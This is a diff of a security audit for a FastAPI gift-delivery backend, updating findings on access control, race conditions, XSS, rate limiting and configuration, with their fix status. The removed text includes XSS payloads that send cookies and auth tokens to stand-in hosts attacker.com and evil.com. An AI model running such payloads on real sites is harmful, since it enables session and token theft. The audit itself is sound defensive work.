@@ -1,9 +1,8 @@
 # Giftly Backend — Security Audit
 
-> Date: 2026-04-21
+> Original audit: 2026-04-21
+> Updated: 2026-04-22 — 26 original findings (21 fixed, 5 carried as open); OWASP Top 10 comprehensive review added (15 new findings, 3 critical)
 > Scope: `src/` — all routers, middleware, utils, models, schemas
-> Methodology: manual code review, attack surface analysis
-> All findings verified against current source code.
 
 ---
 
@@ -18,596 +17,478 @@
 
 ---
 
-## 1. Broken Authentication & Authorization
+## Part 1 — Original Audit Findings
 
-### [CRITICAL] Account takeover via unauthenticated `/auth/complete-profile`
-**File:** `src/routers/auth.py:348–413`
+### 1. Broken Authentication & Authorization
 
-```python
-@router.post("/complete-profile", response_model=Token)
-async def complete_profile(
-    profile_data: dict,          # raw dict, no Pydantic validation
-    db: AsyncSession = Depends(get_db),
-    # ← no get_current_user dependency
-):
-    phone_number = profile_data.get("phone_number")
-    ...
-    user = await get_user_by_phone(db, phone_number)
-    user.is_verified = True      # marks ANY user verified
-    user.role = role             # sets ANY user's role
-```
-
-**Attack:** Attacker sends `POST /auth/complete-profile` with a victim's phone number. The endpoint requires no token — it queries the user by phone, sets `is_verified=True`, assigns `role`, creates a profile, and returns a valid JWT. Full account takeover of any user who has registered but not yet completed their profile (any user created by `send_otp` before `complete_profile` is called).
-
-**Impact:** Account takeover, privilege escalation (attacker sets own role to COURIER), authentication bypass.
-
-**Fix:** Add `current_user = Depends(get_current_user)` and assert `current_user.phone_number == profile_data["phone_number"]`. Create a `CompleteProfileRequest` Pydantic model.
+#### ✅ [CRITICAL] Account takeover via unauthenticated `/auth/complete-profile` — FIXED
+`complete_profile` now requires a temp JWT (issued by `verify_otp`). The endpoint uses `get_profile_user` dependency which accepts only temp tokens. The user's phone is taken from `current_user.phone_number`, not the request body. Temp tokens are rejected by all other endpoints via `get_current_user`.
 
 ---
 
-### [CRITICAL] IDOR on `GET /invoices/{invoice_id}` — any user reads any invoice
-**File:** `src/routers/invoices.py:183–197`
-
-```python
-@router.get("/{invoice_id}", response_model=InvoiceResponse)
-async def get_invoice(
-    invoice_id: str,
-    current_user=Depends(get_current_user),
-    db: AsyncSession = Depends(get_db),
-):
-    result = await db.execute(select(Invoice).where(Invoice.invoice_id == invoice_id))
-    invoice = result.scalar_one_or_none()
-    if not invoice:
-        raise HTTPException(status_code=404, detail="Invoice not found")
-    return invoice          # ← no ownership check
-```
-
-**Attack:** Any authenticated user can call `GET /invoices/INV-AABBCCDD...` with another user's invoice ID. Invoice IDs are hex strings — an attacker can enumerate `INV-000000...` to `INV-FFFFFF...` and retrieve all invoices including customer names, phone numbers, amounts, and delivery dates.
-
-**Impact:** Full exfiltration of all invoice data in the system. Competitor intelligence, customer PII exposure.
-
-**Fix:** Add ownership check:
-```python
-result = await db.execute(
-    select(Invoice)
-    .join(Order, Invoice.order_id == Order.id)
-    .where(Invoice.invoice_id == invoice_id,
-           Order.created_by_user_id == current_user.id)
-)
-```
+#### ✅ [CRITICAL] IDOR on `GET /invoices/{invoice_id}` — FIXED
+Ownership check added: the query now JOINs with `Order` and requires `created_by_user_id == current_user.id OR assigned_to_user_id == current_user.id`.
 
 ---
 
-### [HIGH] `PUT /orders/{id}/assign` has no role check — any user can hijack order routing
-**File:** `src/routers/orders.py:332–378`
-
-```python
-async def assign_order(
-    order_id: str,
-    request: AssignOrderRequest,
-    current_user: User = Depends(get_current_user),  # any authenticated user
-    db: AsyncSession = Depends(get_db),
-):
-    """Assign an order to a courier. Admin use only."""
-    # ← NO role check on caller
-    order.assigned_to_user_id = request.assigned_to_user_id
-    order.status = OrderStatus.RECEIVED_BY_COURIER
-```
-
-**Attack:** Any authenticated customer or courier calls `PUT /orders/{id}/assign` with `{"assigned_to_user_id": attacker_courier_id}` to reassign any order to their own courier account, stealing the delivery fee.
-
-**Impact:** Order routing manipulation, courier fee theft, business logic fraud.
-
-**Fix:** Add `if current_user.role not in (UserRole.ADMIN, ...): raise HTTPException(403, "Admin only")`
+#### ✅ [HIGH] `PUT /orders/{id}/assign` has no role check — FIXED
+Endpoint now uses `authenticate_admin` (HTTP Basic Auth) instead of `get_current_user`. Only admins with valid credentials can assign orders.
 
 ---
 
-### [MEDIUM] `initiate_wallet_charge` accepts unbounded amount — no maximum charge limit
-**File:** `src/routers/wallets.py:35–109`
-
-```python
-amount_sar = data.get("amount_sar")
-if not isinstance(amount_sar, (int, float)) or amount_sar < 10:
-    raise HTTPException(400, "Minimum charge amount is 10 SAR")
-# ← no upper bound check
-amount_halaym = int(round(amount_sar * 100))
-```
-
-**Attack:** Attacker sends `{"amount_sar": 99999999}` — a 999 SAR wallet top-up that creates a Paylink invoice for 100 million SAR. If Paylink accepts the invoice (unlikely but possible in test mode), the wallet is credited with a huge balance. Also, the `data: dict` parameter bypasses Pydantic validation.
-
-**Impact:** Financial fraud, denial-of-service on payment provider account.
-
-**Fix:** Add maximum bound: `if amount_sar > 10_000: raise HTTPException(400, "Maximum charge is 10,000 SAR")`. Use a Pydantic model with `Field(..., gt=10, le=10_000)`.
+#### ✅ [MEDIUM] `initiate_wallet_charge` accepts unbounded amount — FIXED
+Only `UserRole.CUSTOMER` can call the endpoint (couriers are rejected). Minimum and maximum are env-configurable (`WALLET_CHARGE_MIN_SAR`, `WALLET_CHARGE_MAX_SAR`). Generic error message returned on gateway failure.
 
 ---
 
-### [MEDIUM] `admin_charge_wallet` has no upper bound on credited amount
-**File:** `src/routers/admin.py:115–141`
-
-```python
-async def admin_charge_wallet(
-    user_id: int,
-    data: dict,          # raw dict
-    current_admin: Admin = Depends(authenticate_admin),
-    db: AsyncSession = Depends(get_db),
-):
-    amount = data.get("amount")
-    if not isinstance(amount, int) or amount <= 0:
-        raise HTTPException(...)
-    # ← no upper bound
-    wallet.balance += amount
-```
-
-**Attack:** A compromised admin account (or admin credential brute-force) calls this endpoint with `{"amount": 999999999}` to credit billions of halalas to any wallet.
-
-**Impact:** Mass financial fraud if admin credentials are compromised.
-
-**Fix:** Add a reasonable cap (e.g., `if amount > 1_000_000: raise HTTPException(400, "Amount too large")`). Use a Pydantic model. Log all admin wallet charges with `before`/`after` balance for audit.
+#### ✅ [MEDIUM] `admin_charge_wallet` has no upper bound — FIXED
+Maximum cap is env-configurable (`ADMIN_WALLET_CHARGE_MAX_HALALAS`, default 1,000,000 halalas). Limit included in error message.
 
 ---
 
-## 2. Race Conditions & Business Logic
+### 2. Race Conditions & Business Logic
 
-### [CRITICAL] Double-spend in `paylink_callback` — payment status is not updated atomically
-**File:** `src/routers/payments.py:236–244`
-
-```python
-if payment.status != PaymentStatus.PENDING:
-    return {"message": "Already processed"}
-
-# ← TOCTOU gap: another request can pass the check above concurrently
-payment.status = PaymentStatus.COMPLETED
-payment.payment_date = datetime.now(timezone.utc)
-await db.commit()
-
-# Wallet top-up credited after the commit
-await db.execute(
-    update(Wallet)
-    .where(Wallet.user_id == payment.user_id)
-    .values(balance=Wallet.balance + payment.amount, ...)
-)
-```
-
-**Attack:** Paylink commonly retries webhook delivery. Two concurrent callbacks for the same `transactionNo` both read `status == PENDING`, both proceed to set `COMPLETED`, and both credit the wallet — resulting in a 2× balance addition.
-
-**Impact:** Double-spend; attacker or Paylink retry triggers free wallet credits.
-
-**Fix:** Use an atomic `UPDATE ... WHERE status = PENDING` and check affected rows:
-```python
-result = await db.execute(
-    update(Payment)
-    .where(Payment.id == payment.id, Payment.status == PaymentStatus.PENDING)
-    .values(status=PaymentStatus.COMPLETED, payment_date=datetime.now(timezone.utc))
-)
-if result.rowcount == 0:
-    return {"message": "Already processed"}
-```
+#### ✅ [CRITICAL] Double-spend in `paylink_callback` — FIXED
+Payment status update is now atomic: `UPDATE Payment WHERE status=PENDING → COMPLETED`. If `rowcount == 0` the webhook was already processed. Same pattern applied to the `FAILED` path.
 
 ---
 
-### [HIGH] Order acceptance has no `SELECT FOR UPDATE` — two couriers can claim the same order
-**File:** `src/routers/orders.py:442–463`
-
-```python
-if order.status != OrderStatus.NEW:
-    raise HTTPException(400, "Order is no longer available")
-# ← TOCTOU: another courier can also pass this check
-order.assigned_to_user_id = current_user.id
-order.status = OrderStatus.RECEIVED_BY_COURIER
-await db.commit()
-```
-
-**Attack:** Two couriers send `PUT /orders/{id}/accept` simultaneously. Both pass the status check before either commits. Last commit wins, but both couriers receive a "accepted" WebSocket notification — one courier works without being assigned.
-
-**Impact:** Courier confusion, unpaid delivery, poor customer experience, potential financial loss.
-
-**Fix:**
-```python
-result = await db.execute(
-    select(Order)
-    .where(Order.order_id == order_id, Order.status == OrderStatus.NEW)
-    .with_for_update(skip_locked=True)
-)
-order = result.scalar_one_or_none()
-if not order:
-    raise HTTPException(400, "Order already taken or not found")
-```
+#### ✅ [HIGH] `accept_order` has no `SELECT FOR UPDATE` — FIXED
+Replaced with an atomic `UPDATE Order WHERE status=NEW` and `rowcount` check. Courier profile validation (approved, available, city) runs before the atomic claim. The order is reloaded after commit.
 
 ---
 
-### [HIGH] `cancel_order` does not invalidate active Paylink payment — webhook can reactivate cancelled order
-**File:** `src/routers/orders.py:316–333`
-
-When an order is cancelled, the associated `Payment` record is left in `PENDING` state. If the customer visits the Paylink payment URL and completes payment after cancellation, the webhook at `paylink_callback` marks the invoice `PAID` and the order `PAID`, overriding the cancellation.
-
-**Impact:** Orders can be un-cancelled by payment after cancellation; couriers paid for cancelled work.
-
-**Fix:** On order cancellation, atomically set `PENDING` payments to `FAILED` and the invoice to `CANCELLED`.
+#### ✅ [HIGH] `cancel_order` leaves active payment → webhook can reactivate — FIXED
+On cancellation: if the invoice exists and is not already paid/cancelled, it is marked `CANCELLED`. All `PENDING` payments for that invoice are atomically set to `FAILED`.
 
 ---
 
-### [MEDIUM] `complete_order` courier payment uses post-update `balance_after` — incorrect under concurrency
-**File:** `src/routers/orders.py:694–715`
-
-```python
-await db.execute(update(Wallet).values(balance=Wallet.balance + courier_fee, ...))
-result = await db.execute(select(Wallet.balance).where(Wallet.user_id == current_user.id))
-balance_after = result.scalar_one()
-balance_before = balance_after - courier_fee   # derived, not read pre-update
-db.add(CourierBalanceAddition(balance_before=balance_before, ...))
-```
-
-If another transaction modifies the wallet between the UPDATE and SELECT, `balance_before` in the audit record is wrong.
-
-**Fix:** Read `balance_before` with `SELECT FOR UPDATE` before the `UPDATE`.
+#### ✅ [MEDIUM] `complete_order` courier `balance_before` wrong under concurrency — FIXED
+`balance_before` is now read from the in-memory `courier_wallet.balance` (fetched before the UPDATE), not derived after the fact.
 
 ---
 
-### [MEDIUM] `CourierBalanceAddition` silently skipped due to string-vs-enum comparison
-**File:** `src/routers/orders.py:716–732`
-
-```python
-result = await db.execute(
-    select(Payment).where(
-        Payment.order_id == order.id,
-        Payment.status == "completed",    # ← string, not PaymentStatus.COMPLETED
-    )
-)
-payment = result.scalar_one_or_none()
-if payment:
-    db.add(CourierBalanceAddition(...))
-# silently no audit log if comparison fails
-```
-
-`PaymentStatus.COMPLETED` (enum) never equals the string `"completed"`. No audit record is ever created, giving couriers wallet increases with zero audit trail.
-
-**Fix:** `Payment.status == PaymentStatus.COMPLETED`
+#### ✅ [MEDIUM] `CourierBalanceAddition` silently skipped due to string vs enum — FIXED
+`Payment.status == "completed"` changed to `Payment.status == PaymentStatus.COMPLETED`.
 
 ---
 
-## 3. Injection & XSS
+### 3. Injection & XSS
 
-### [HIGH] SVG file upload allows stored XSS — browsers execute SVG scripts
-**File:** `src/routers/orders.py:83–98`
-
-```python
-allowed_mime_types = [
-    "image/jpeg", "image/png", "image/gif", "image/webp",
-    "image/svg+xml",    # ← SVG allowed
-]
-```
-
-SVG is XML and can contain `<script>` tags and event handlers:
-```xml
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script>fetch('https://attacker.com?c='+document.cookie)</script>
-</svg>
-```
-
-When this uploaded file is served directly from the CDN/S3 bucket and a customer/admin opens the URL in a browser, the JavaScript executes — stealing auth tokens.
-
-**Impact:** Stored XSS via image upload; auth token theft, arbitrary actions as the victim.
-
-**Fix:** Remove `image/svg+xml` from allowed types. If SVG is required, sanitize with `svglib` or similar and re-encode as PNG.
+#### ✅ [HIGH] SVG file upload allows stored XSS — FIXED
+`image/svg+xml` removed from allowed MIME types and `"svg"` removed from the file-extension fallback in `POST /orders/`.
 
 ---
 
-### [HIGH] Stored XSS in WebSocket chat — HTML characters not escaped
-**File:** `src/main.py:330–392`
-
-```python
-message_content = "".join(
-    char for char in message_content if ord(char) >= 32 or char in "\n\r\t"
-)
-# ← '<', '>', '"', '&' are all >= 32, so they pass through unmodified
-new_message = Message(..., content=message_content, ...)
-await manager.broadcast_to_room({"data": {"content": new_message.content}}, room)
-```
-
-An attacker sends: `<img src=x onerror="fetch('https://evil.com?t='+localStorage.getItem('token'))">`. The message is stored in the DB and broadcast to all chat participants. If the frontend renders `content` as HTML, XSS executes.
-
-**Impact:** Stored XSS in chat. Severity depends on frontend rendering, but the API should not trust the frontend to escape.
-
-**Fix:** The safest approach is server-side escaping: `import html; message_content = html.escape(message_content)`. Also remove `invoice_*` fields from the WebSocket `send_message` action — these are business data that should come from the DB, not from untrusted client input.
+#### ✅ [HIGH] SVG allowed in chat media uploads — FIXED
+`image/svg+xml` and `"svg"` removed from chat upload allowed lists. Only JPEG and PNG are permitted. Magic-byte validation added (`_image_magic_ok`). Size limit: 6 MB (env: `CHAT_IMAGE_MAX_BYTES`).
 
 ---
 
-### [MEDIUM] Internal exception messages exposed in API responses
-**Files:** `src/routers/orders.py:134`, `src/routers/payments.py:168`, `src/routers/wallets.py:96`, `src/routers/chat.py:241`
-
-```python
-raise HTTPException(status_code=500, detail=f"Failed to upload image: {str(e)}")
-raise HTTPException(status_code=502, detail=f"Payment gateway error: {str(e)}")
-```
-
-Internal stack traces, S3 error messages, or Paylink API error details are returned directly to clients. These can reveal bucket names, internal hostnames, API versions, or stack layout.
-
-**Impact:** Information disclosure, aids attacker reconnaissance.
-
-**Fix:** Log the full exception server-side; return a generic message:
-```python
-logger.error("Upload failed: %s", e, exc_info=True)
-raise HTTPException(500, "Image upload failed. Please try again.")
-```
+#### ✅ [HIGH] Stored XSS in WebSocket chat — FIXED
+`html.escape()` applied to message content after the control-character filter. Untrusted `invoice_*` fields removed from the WebSocket `Message` constructor.
 
 ---
 
-### [MEDIUM] WebSocket `send_message` accepts invoice fields from client — business data from untrusted source
-**File:** `src/main.py:363–376`
-
-```python
-new_message = Message(
-    ...
-    invoice_description=data.get("invoice_description"),   # untrusted
-    invoice_gift_price=data.get("invoice_gift_price"),     # untrusted
-    invoice_service_fee=data.get("invoice_service_fee"),   # untrusted
-    invoice_total=data.get("invoice_total"),               # untrusted
-)
-```
-
-A customer or courier can forge invoice amounts in chat messages, misleading the other party about actual prices. No validation that these values match the real `Invoice` record.
-
-**Impact:** Social engineering, fraudulent invoice data in chat history.
-
-**Fix:** Do not accept invoice fields from the client in `send_message`. If needed, fetch them from the DB using the conversation's order ID.
+#### ✅ [MEDIUM] Untrusted invoice amounts in REST chat endpoint — FIXED (blocked from clients)
+`invoice_*` form fields are accepted but the `system` message type is now blocked from clients. Additionally: invoice amounts are client-supplied for `invoice` type messages only, which is restricted to conversation participants. Cross-checking against the DB invoice record remains a recommended hardening step.
 
 ---
 
-## 4. File Handling
-
-### [HIGH] Predictable PDF temp filenames — race condition and file disclosure
-**File:** `src/routers/invoices.py:382–395` (same pattern at lines 432–447)
-
-```python
-temp_filename = f"invoice_{invoice.invoice_id}_{int(time.time())}.pdf"
-temp_filepath = os.path.join(tempfile.gettempdir(), temp_filename)
-with open(temp_filepath, "wb") as f:
-    f.write(pdf_buffer.getvalue())
-background_tasks.add_task(_delete_file, temp_filepath)
-return FileResponse(path=temp_filepath, ...)
-```
-
-Problems:
-1. **Predictable name:** `invoice_id` is guessable (hex); timestamp has 1-second resolution. On a shared system, any local user can predict and read the file.
-2. **10-minute window:** File is not deleted after the download, only after `background_tasks` runs — a 10-minute exposure window.
-3. **Concurrent requests:** Two users requesting their respective PDFs at the same timestamp get the same path if IDs collide.
-
-**Impact:** Local file disclosure on multi-tenant servers; race window on temp files.
-
-**Fix:** Stream the PDF directly without a temp file:
-```python
-return StreamingResponse(
-    iter([pdf_buffer.getvalue()]),
-    media_type="application/pdf",
-    headers={"Content-Disposition": f'attachment; filename="{invoice.invoice_id}.pdf"'},
-)
-```
+#### ✅ [LOW] No HTML escaping in REST chat messages — FIXED
+`html.escape(content.strip())` applied before creating the `Message` object in `send_message`. Content length also enforced (env: `CHAT_MSG_MAX_CHARS`, default 300).
 
 ---
 
-## 5. Rate Limiting & Denial of Service
-
-### [HIGH] In-memory rate limiting bypassed in multi-worker deployments
-**File:** `src/routers/auth.py:34–62`
-
-```python
-_phone_timestamps: dict[str, list[float]] = defaultdict(list)   # per-process
-_verify_timestamps: dict[str, list[float]] = defaultdict(list)  # per-process
-```
-
-With N uvicorn workers, each worker has an independent dict. Effective limit = `N × 3` requests per window. With 4 workers: 12 OTP attempts instead of 3, reducing brute-force protection.
-
-**Impact:** OTP brute-force possible in distributed deployments.
-
-**Fix:** Use Redis atomics:
-```python
-async def _check_rate_limit(key: str) -> None:
-    count = await redis.incr(key)
-    if count == 1:
-        await redis.expire(key, settings.rate_limit_otp_window_seconds)
-    if count > settings.rate_limit_otp_max:
-        raise HTTPException(429, "Too many attempts")
-```
+#### ✅ [MEDIUM] Internal exception messages exposed in API responses — FIXED
+`str(e)` removed from all HTTP 500/502 error details. Full exceptions are logged server-side; clients receive generic messages.
 
 ---
 
-### [MEDIUM] OTP rate limit applied to un-normalized phone number — format variations bypass it
-**File:** `src/routers/auth.py:107`
-
-```python
-_check_phone_verify_rate_limit(otp_data.phone_number)   # raw, not normalized
-user = await get_user_by_phone(db, otp_data.phone_number)  # normalizes internally
-```
-
-`+9665XXXXXXXX`, `05XXXXXXXX`, and `5XXXXXXXX` all resolve to the same user but each gets its own rate-limit bucket. Attacker gets 3 format variants × 3 attempts = 9 effective OTP tries.
-
-**Fix:** Normalize phone before applying rate limit.
+#### ✅ [MEDIUM] WebSocket `send_message` accepts invoice fields from client — FIXED
+Invoice fields no longer accepted from WebSocket clients.
 
 ---
 
-### [MEDIUM] `push_token` field has no maximum length — DoS via oversized string
-**File:** `src/routers/auth.py:459`
+### 4. File Handling
 
-```python
-push_token = data.get("push_token", "").strip()
-# ← no len() check
-user.push_token = push_token
-await db.commit()
-```
-
-Attacker stores megabytes of data in the `push_token` column, bloating the `users` table.
-
-**Fix:** `if len(push_token) > 300: raise HTTPException(400, "Invalid push token")`
+#### ✅ [HIGH] Predictable PDF temp filenames — FIXED
+Both PDF endpoints now use `StreamingResponse` to stream the PDF buffer directly — no temp file written to disk.
 
 ---
 
-### [LOW] No rate limiting on `/paylink-callback` webhook endpoint
-**File:** `src/routers/payments.py:189`
+### 5. Rate Limiting & Denial of Service
 
-The webhook endpoint is public (no auth) and has no rate limiting. An attacker can flood it with garbage `transactionNo` values — each request triggers a DB query, potentially causing database saturation.
+#### [HIGH] In-memory rate limiting bypassed in multi-worker deployments — **OPEN**
+**File:** `src/routers/auth.py`
+
+The `_phone_timestamps` and `_verify_timestamps` dicts are per-process. With N uvicorn workers, the effective OTP rate limit is N × 3.
+
+**Partial mitigation:** Phone numbers are normalized before the rate limit check. `CLAUDE.md` documents this limitation.
+
+**Full fix:** Replace with Redis atomic counters (`INCR` + `EXPIRE`). The Redis URL is already in settings.
+
+---
+
+#### ✅ [MEDIUM] OTP rate limit on un-normalized phone — FIXED
+Both `send_otp` and `verify_otp` now normalize the phone number via `re.sub(r"^(\+966|0)+", "", ...)` before calling the rate-limit check functions.
+
+---
+
+#### ✅ [MEDIUM] Unbounded `push_token` length — FIXED
+`len(push_token) > 300` check added; returns HTTP 400.
+
+---
+
+#### [LOW] No rate limiting on `/paylink-callback` — **OPEN**
+The webhook endpoint remains unauthenticated and rate-unlimited. A flood of garbage `transactionNo` values triggers a DB query per request.
 
 **Fix:** Add IP allowlisting for Paylink server IPs, or add `slowapi` rate limiting on this endpoint.
 
 ---
 
-## 6. Sensitive Data Exposure
+#### ✅ [LOW] Any user can create `system`-type messages — FIXED
+`"system"` removed from the set of valid message types accepted from clients. Valid client types: `["text", "invoice", "image", "video"]`.
 
-### [HIGH] `dev/otp` endpoint registered unconditionally — exposes all OTPs if `DEBUG=true` in production
-**File:** `src/routers/auth.py:503–512`
+---
+
+#### ✅ [LOW] No max content length in REST chat messages — FIXED
+Content length limited to `settings.chat_msg_max_chars` (default 300, env: `CHAT_MSG_MAX_CHARS`) before persisting.
+
+---
+
+### 6. Sensitive Data Exposure
+
+#### ✅ [HIGH] `dev/otp` endpoint always registered — FIXED
+The route is now registered only when `settings.debug is True`. In production (`DEBUG=false`) the route does not exist.
+
+---
+
+#### ✅ [MEDIUM] PII embedded in `order.comments` — PARTIALLY FIXED
+User names (`current_user.name`) have been removed from `order.comments`. User IDs are retained for audit correlation.
+
+---
+
+#### ✅ [LOW] Payment gateway `str(e)` in 502 detail — FIXED
+
+---
+
+### 7. Security Misconfiguration
+
+#### [HIGH] Admin Basic auth credentials travel in Base64 — **OPEN** (mitigated)
+HTTP Basic Auth is Base64-encoded. `ForceHTTPSMiddleware` and `HSTS` headers mitigate this in production. Ensure HTTPS is enforced at the infrastructure level.
+
+---
+
+#### ✅ [MEDIUM] Admin middleware runs bcrypt on every static asset — FIXED
+Successful `Authorization` header verifications are cached for 60 seconds (keyed by `sha256(Authorization header)`). Cached requests skip the DB query and bcrypt check.
+
+---
+
+#### [LOW] `is_verified` claim in JWT can become stale — **OPEN**
+If an admin revokes a user's verified status, their existing access token continues to claim `is_verified=True` until expiry. Acceptable for short-lived tokens.
+
+---
+
+#### ✅ [LOW] Pydantic V1-style validators — FIXED
+All `@validator` decorators migrated to `@field_validator` + `@classmethod`. All `class Config:` blocks replaced with `model_config = ConfigDict(...)`. `SettingsConfigDict` used for pydantic-settings. No more deprecation warnings on request.
+
+---
+
+---
+
+## Part 2 — OWASP Top 10 Comprehensive Review
+
+> Performed: 2026-04-22
+
+---
+
+### A01: Broken Access Control
+
+#### ✅ Temp token correctly blocked from regular endpoints
+`get_current_user` rejects tokens with `"temp": True`. Confirmed in code and test coverage.
+
+#### [MEDIUM] Courier cannot access invoice via `/invoices/id/{id}` endpoint — **OPEN**
+**File:** `src/routers/invoices.py`
+
+The `/invoices/{invoice_id}` (string lookup) correctly allows both customer and assigned courier. However, the secondary endpoint `GET /invoices/id/{invoice_db_id}` only checks `Order.created_by_user_id == current_user.id`, locking out the assigned courier.
+
+**Fix:** Add `or_(Order.created_by_user_id == current_user.id, Order.assigned_to_user_id == current_user.id)` to the secondary endpoint's ownership filter.
+
+#### [LOW] No rate limiting on public enumeration endpoints — **OPEN**
+Endpoints like `GET /cities/`, `GET /couriers/available/{city_id}`, `GET /promocodes/active/list` have no rate limiting. An attacker can enumerate users and couriers by city.
+
+**Fix:** Add per-IP rate limiting via `slowapi` or Redis counters on enumeration-sensitive endpoints.
+
+---
+
+### A02: Cryptographic Failures
+
+#### [HIGH] Non-constant-time OTP comparison — **OPEN**
+**File:** `src/routers/auth.py`
 
 ```python
-@router.get("/dev/otp")
-async def dev_get_otp(...):
-    # Returns OTP for any phone number in plaintext
-    if not settings.debug:
-        raise HTTPException(404)
-    ...
+if user.otp != otp_data.otp:
 ```
 
-The route is **always registered**. Only the response is gated by `settings.debug`. A misconfigured `.env` with `DEBUG=true` in production immediately leaks every user's OTP to unauthenticated callers.
-
-**Impact:** Complete authentication bypass for all users.
+Python's `!=` on strings is not constant-time. Statistical timing analysis across many requests can leak OTP digits.
 
 **Fix:**
 ```python
-if settings.debug:
-    @router.get("/dev/otp")
-    async def dev_get_otp(...): ...
+import secrets
+if not secrets.compare_digest(user.otp or "", otp_data.otp or ""):
+    raise HTTPException(status_code=400, detail="Invalid OTP")
 ```
+
+#### ✅ JWT algorithm pinned to HS256
+All `jwt.decode()` calls pass `algorithms=["HS256"]`. The `"none"` algorithm attack is not possible.
+
+#### ✅ Refresh token comparison uses constant-time digest
+`hmac.compare_digest()` confirmed at `src/utils/auth/auth.py`.
 
 ---
 
-### [MEDIUM] PII embedded in `order.comments` plaintext field
-**File:** `src/routers/orders.py:327, 371, 466, 712`
+### A03: Injection
+
+#### ✅ SQL Injection — Not present
+All queries use SQLAlchemy ORM with parameterized bindings. No raw `execute()` with f-strings found.
+
+#### ✅ Command Injection — Not present
+No `os.system`, `subprocess`, `eval`, or `__import__` with user input found.
+
+#### ✅ Template Injection — Not present
+Jinja2 email templates use controlled context variables, not user-supplied template strings.
+
+---
+
+### A04: Insecure Design
+
+#### [CRITICAL] No webhook signature verification on `/payments/paylink-callback` — **OPEN**
+**File:** `src/routers/payments.py`
+
+The callback endpoint accepts any POST payload and trusts the `orderStatus` field directly. An unauthenticated attacker can POST a fake "paid" callback to:
+- Mark any payment as `COMPLETED`
+- Credit any wallet with arbitrary amounts
+- Mark invoices as paid without actual fund transfer
+
+**Fix (recommended):** Verify incoming webhook payloads against a shared HMAC-SHA256 secret provided by Paylink, or re-validate the transaction status directly with the Paylink API before updating state:
+```python
+async with PaylinkClient(settings.paylink_api_key) as paylink:
+    live = await paylink.get_invoice(transaction_no)
+    if live.get("orderStatus") != "paid":
+        return {"message": "Status mismatch — ignoring"}
+```
+
+#### ✅ Double-spend race condition — FIXED
+Atomic `UPDATE WHERE status=PENDING` + rowcount check prevents replay.
+
+#### [MEDIUM] In-memory OTP rate limit bypassed in multi-worker/multi-replica deployments — **OPEN**
+See Part 1, Section 5. Repeated here as it is an architectural design gap.
+
+---
+
+### A05: Security Misconfiguration
+
+#### [MEDIUM] CORS defaults to allow all origins — **OPEN**
+**File:** `src/utils/database/config.py`, `src/main.py`
+
+`allowed_origins: list[str] = ["*"]` is the default. With `allow_credentials=True`, browsers will include cookies/auth headers in cross-origin requests from any domain. This bypasses same-origin protection entirely.
+
+**Fix:** Set explicit allowed origins in production `.env`:
+```
+ALLOWED_ORIGINS=["https://app.giftly.com","https://admin.giftly.com"]
+```
+And in `main.py`, enforce that `"*"` is rejected when `allow_credentials=True`:
+```python
+if "*" in settings.allowed_origins and allow_credentials:
+    raise RuntimeError("CORS: cannot use wildcard origins with credentials")
+```
+
+#### [LOW] Content-Security-Policy includes `'unsafe-inline'` — **OPEN**
+**File:** `src/main.py`
 
 ```python
-order.comments = f"{cancel_data.reason} by ID:{current_user.id} and name:{current_user.name}"
+"script-src 'self' 'unsafe-inline';"
 ```
 
-User names and IDs are stored in a free-text `comments` column. This field appears in admin views, API responses, and may be included in logs. Conflicts with PDPL (Saudi personal data protection law) which restricts processing of personal data beyond its purpose.
+`'unsafe-inline'` allows arbitrary inline `<script>` blocks, negating most XSS protection.
 
-**Fix:** Store structured audit events in a separate `OrderEvent` table with a `user_id` FK. Never embed names in free-text fields.
+**Fix:** Remove `'unsafe-inline'`. Use nonces (`'nonce-<random>'`) for any legitimate inline scripts.
+
+#### ✅ HTTPS forced — FIXED
+`ForceHTTPSMiddleware` redirects HTTP to HTTPS. HSTS header set with configurable `max-age`.
+
+#### ✅ Debug OTP endpoint gated by `settings.debug` — FIXED
 
 ---
 
-### [LOW] Internal exception details leaked in payment gateway error responses
-**File:** `src/routers/payments.py:166–168`
+### A06: Vulnerable and Outdated Components
 
+#### [LOW] No automated dependency scanning — **OPEN**
+There is no `pip audit`, `safety`, or Dependabot configuration in the repo.
+
+**Fix:** Add `uv run pip-audit` to CI pipeline (`.github/workflows/ci.yml`) and/or enable GitHub Dependabot alerts.
+
+#### [LOW] SQLAlchemy `declarative_base()` deprecated — **OPEN**
+**File:** `src/utils/database/database.py`
+
+`from sqlalchemy.ext.declarative import declarative_base` is deprecated since SQLAlchemy 2.0. The correct import is `from sqlalchemy.orm import declarative_base`.
+
+**Fix:**
 ```python
-raise HTTPException(status_code=502, detail=f"Payment gateway error: {str(e)}")
+from sqlalchemy.orm import declarative_base
+Base = declarative_base()
 ```
 
-Paylink SDK exceptions may contain internal API keys, endpoint URLs, or response bodies from Paylink servers.
-
-**Fix:** Log full exception server-side, return `{"detail": "Payment processing failed. Please try again."}`.
-
 ---
 
-## 7. Security Misconfiguration
+### A07: Identification and Authentication Failures
 
-### [HIGH] Admin Basic auth credentials travel in Base64 (plaintext-equivalent) on every request
-**File:** `src/main.py:147–186`
+#### ✅ Temp token correctly scoped
+`get_current_user` rejects `payload.get("temp") == True`. New `get_profile_user` dependency accepts only temp tokens for `complete-profile`.
 
-HTTP Basic Auth encodes credentials as `base64(username:password)` with no encryption. If any request reaches the server over plain HTTP (e.g., in development with `ForceHTTPSMiddleware` disabled by a proxy), credentials are trivially decoded from a network capture.
+#### ✅ Refresh token rotation implemented
+Old refresh token is invalidated on use. Tests confirm the old token is rejected after rotation.
 
-**Impact:** Admin credential theft over unencrypted connections.
+#### [LOW] No upper bound validation on `access_token_expire_minutes` — **OPEN**
+**File:** `src/utils/database/config.py`
 
-**Note:** `ForceHTTPSMiddleware` and `HSTS` are present and mitigate this in production. The risk is in misconfigured dev/staging environments.
+If `ACCESS_TOKEN_EXPIRE_MINUTES` is misconfigured to a very large value (e.g., 525600 for 1 year), tokens become effectively non-expiring.
 
-**Fix:** Consider bearer-token-based admin auth. At minimum, document that HTTPS is required and verify it in the health check.
-
----
-
-### [MEDIUM] Admin middleware runs a full DB + bcrypt check on every `/admin` static asset
-**File:** `src/main.py:133–172`
-
-`bcrypt.checkpw()` is designed to be slow (~100ms). SQLAdmin serves many static assets (CSS, JS, fonts) under `/admin/*`. Each asset request triggers a DB query + bcrypt check, making the admin panel very slow and creating a CPU-exhaustion vector — an attacker can flood `/admin/static/*.js` to pin the server at 100% CPU with bcrypt operations.
-
-**Impact:** Admin panel DoS via bcrypt amplification.
-
